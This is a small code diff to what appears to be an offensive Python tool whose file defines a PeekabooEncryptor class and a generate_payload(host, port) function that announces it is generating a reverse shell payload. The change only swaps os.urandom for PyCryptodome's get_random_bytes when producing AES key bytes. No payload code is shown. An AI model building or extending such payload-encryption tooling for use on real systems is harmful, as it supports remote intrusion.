@@ -7,7 +7,7 @@ import os
 import hashlib
 import string
 from Crypto.Cipher import AES
-from os import urandom
+from Crypto.Random import get_random_bytes
 
 class Colors:
     HEADER = '\033[95m'
@@ -90,7 +90,7 @@ class PeekabooEncryptor():
         return ciphertext, key
 
     def random_bytes(self):
-        return urandom(16)
+        return get_random_bytes(16)
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
